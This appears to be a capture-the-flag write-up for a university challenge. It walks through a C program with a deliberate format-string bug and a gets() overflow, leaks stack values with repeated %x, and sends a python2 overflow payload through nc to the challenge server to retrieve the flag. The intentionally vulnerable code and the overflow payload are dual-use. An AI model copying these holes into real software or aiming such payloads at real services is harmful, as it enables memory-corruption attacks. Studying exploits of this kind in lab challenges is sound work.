# Overview
First, we look at the code:  
```
#include <stdio.h>

int main(int argc, char const *argv[])
{
    long flag = 0;
    long a = SOME_INTEGER_CONSTANT;
    char pass[32] = "abcd";
    char name[32] = {0};

    printf("Enter your name - MAX length 32\n");
    gets(name);
    printf(name);

    printf("Enter your password - MAX length 32\n");
    gets(pass);

    if (a != SOME_INTEGER_CONSTANT) {
        printf("Are you trying to cause problems here? calling the police, you better run.\nMY canary can still breathe!\n");
    } else if (flag) {
        printf("biuCTF{7h15_i5_f4|<e_f149}\n");
    } else {
        printf("Wrong password...\n");
    }
}
```
We can easily see that our goal is to exploit a simple buffer overflow to change the value of *flag* to not be 0.  
But we cannot just exploit a buffer overflow here, because we have a **stack canary** here, which is a common technique to prevent buffer overflows. It is actually a special value which is saved on the top of the buffer, and later is checked to see if it has changed because of a buffer overflow. We can see that the canary isn't random or something, but it is a constant value. So if we know the value of the canary, we can simply overflow the buffer and put the original stack canary in its place, so the program will not know that there was a buffer overflow. But how can we know the value of the stack canary?  

# Format string vulnerability
The **printf** function always gets a format strin gin the first parameter, which is a string which contains format parameters (or not), which are of the form %<format_type>. The printf function treats for every format parameter as a real parameter and prints it. So, if we give printf a format string in its first parameter (for example, ```%x``` many times), the printf will think that it has real arguments to print, so it will print the values of the registers and the stack (depending on the architecture, but in any case values from the stack will finally be printed, because the number of the regusters is final), which are considered to be the arguments.

# The exploit
Now, we can actually exploit a format string to leak the value of the stack canary. At the time of the call to printf, the stack looks like that:  
|  value |   size   |
|--------|----------|
|  flag  | 8 bytes  |
|  a     | 8 bytes  |
|  pass  | 32 bytes |
|  name  | 32 bytes |  

So we can make name to be something like ```%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x```, and it will leak us the next values:  
```309176b1 0 fdde1980 5a862410 0 5a862558 f0b5ff 25207825 20782520 78252078 25207825 20782520 78252078 0 0 32```  
actually, the values ```25207825 20782520 78252078 25207825 20782520 78252078``` are the hexadecimal encoding of the string we have just entered, which has also overriden part of pass, and we know that the stack canary should sit just after that. We can see that the last printed value is 0x32, and it makes sense that it will be the value of the stack canary, because it sits just in a perfect place for that, so we will try to treat it is the stack canary and see what we got. That value sits in offset 32 from the place where pass sits in the stack, so we will add a 32 byte padding and then add the value 0x32, which we consider for know to be the stack canary, and then just add 4 bytes to override the value of flag, so we will get into the second if to print the flag.  
So after we leaked the value of the stack canary, the final exploit is:  
```python2 -c 'import struct; print ""; print "A"*32 + struct.pack("Q", 0x32) + "A"*4' | nc challenges.ctf.cs.biu.ac.il 3004```  
And finally got the flag:  
```Enter your name - MAX length 32
Hi, !
Enter your password - MAX length 32
biuCTF{b0f_w1th_c4N4Ry?!}```
